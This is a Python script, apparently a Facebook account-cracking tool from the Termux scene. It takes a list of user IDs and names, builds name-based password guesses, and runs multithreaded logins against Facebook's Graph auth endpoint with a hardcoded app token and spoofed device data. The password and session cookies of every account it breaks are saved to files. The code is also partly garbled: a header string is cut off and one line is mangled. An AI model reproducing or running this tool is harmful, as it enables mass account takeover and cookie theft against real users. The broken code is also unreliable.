#------(modules)-----
#---(le bkl use kr :( ')
import os
try:
    import requests
except ModuleNotFoundError:
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
import random
import time
import sys
import requests
import uuid
import json
import base64
import re
import zlib
import shutil
import platform
import subprocess
import tempfile
import string
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup
from datetime import datetime
#--------(values)-------
oks = []
cps = []
plist = []
methods = []
speed = []
twf = []
loop = 0
#---------(color)------
R = "\033[1;31m"
G = "\033[1;32m"
W = "\033[1;37m"
Y = "\033[1;35m"
B = "\033[96;1m"
P = "\033[1;95m"
#-----(logo)-----
logo = """
  
               ___           ___           ___           ___     
              /  /\         /  /\         /  /\         /__/\    
             /  /::|       /  /::\       /  /::\        \  \:\   
            /  /:|:|      /  /:/\:\     /  /:/\:\        \  \:\  
           /  /:/|:|__   /  /::\ \:\   /  /::\ \:\        \  \:\ 
          /__/:/_|::::\ /__/:/\:\_\:\ /__/:/\:\_\:\  ______\__\:\
          \__\/  /~~/:/ \__\/  \:\/:/ \__\/  \:\/:/ \  \::::::::/
                /  /:/       \__\::/       \__\::/   \  \:\~~~~~ 
               /  /:/        /  /:/        /  /:/     \  \:\     
              /__/:/        /__/:/        /__/:/       \  \:\    
              \__\/         \__\/         \__\/         \__\/    


\x1b[1;97m-------------------------------------------------------
   [•] Owner        :  MAAZ                    
   [•] Facebook     :  Malik Maaz 
   [•] WhatsApp     : 03014258613
   [•] Tool         :  personal
\x1b[1;97m-------------------------------------------------------
   \x1b[1;92m[\x1b[1;97m  PTFRIAPR1231617CST2022CBILHTIW46HCR10225 \x1b[1;92m ]\x1b[1;97m
\x1b[1;97m-------------------------------------------------------"""


#---------(main ua Strings)------
hehehe = "[Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',]"
#--------(hehehe)-----
def flight():
    print(f'\033[1;31m[•] If No Result use Flight Mode')
def linex():
    print(55 * f'{W}-')
def clear():
    os.system('clear')
    print(logo)
#--------(menu)------

def menu():
    os.system('clear')
    print(logo)
    print('[1] File Cloning')
    print('[2] Random Clone')
    print('[3] File creating')
    print('[4] Password menu')
    print('[0] Exit')
    linex()
    lomda = input('\033[1;37mChoose Option :')
    if lomda in ['1']:
        clear()
        file = input('[•] File Path\033[1;37m :')
        try:
            fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            print('[•] Bhen k lody sahi likh ')
            time.sleep(2)
            menu()
        clear()
        print('[1] Method ')
        print ('[2] Method ')
        linex()
        mthd = input('[?] Chose Method :')
        clear()
        #----(add your Own pass)----
        plist = []
        try:
            ps_limit = int(input('[•] Enter password limit :'))
        except:
            ps_limit = 1
        clear()
        for i in range(ps_limit):
            plist.append(input(f'[•] Password {i+1}:'))
        clear()
        with loda(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print('[•] Total Accounts : \033[1;32m' + total_ids)
            flight()
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if mthd in ['1', '01']:
                    crack_submit.submit(M1, ids, names, passlist)
                else:
                    exit()
        print('\033[1;37m')
        linex()
        print('[•] Process completed!')
        print(' Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        linex()
        exit()
#--------(main-method)--------
def M1(ids, names, passlist):
    try:
        global oks, loop
        sys.stdout.write(
            f'\r\r\033[1;37m{G}[MAAZ]{W} %s | OK | \033[1;32m{G}%s{W}\033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last',
                                                                                                          ln).replace(
                'Name', names).replace('name', names.lower())
            access_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10, 99))+".0.0."+str(random.randint(1000, 9999))+";FBBV/"+str(random.randint(1000000, 9999999))+";"+hehehe
      
            headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-PK,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'cache-control': 'max-age=0',
            'referer': 'https://www.google.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"SM-A127F"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'pro
                   }
            data = {
                            'adid': '1DBdDC6FAd1053AB',
                            'format': 'json',
                            'device_id': str(uuid.uuid4()),
                            'family_device_id': str(uuid.uuid4()),
                            'secure_family_device_id': str(uuid.uuid4()),
                            'cpl': 'true',
                            'try_num': '1',
                            'email': ids,
                            'password': pas,
                            'method': 'auth.login',
                            'generate_session_cookies': '1',
                            'sim_serials': "['80973453345210784798']",
                            'openid_flow': 'android_login',
                            'openid_provider': 'google',
                            'openid_emails': "['01710940017']",
                            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                            'error_detail_type': 'button_with_disabled',
                            'source': 'account_recovery',
                            'locale': 'it_IT',
                            'client_country_code': 'US',
                            'fb_api_req_friendly_name': 'authenticate',
                            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
                        }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m[MAAZ-OK] ' + ids + ' | ' + pas + '\033[1;97m')
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
          client_country_code'MAAZ-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                open('/sdcard/MAAZ-OK.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            elif twf in str(po):
                print('\r\r\033[1;36m[MAAZ-2F] ' + ids + ' | ' + pas)
                twf.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/MAAZ-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        time.sleep(20)
menu()
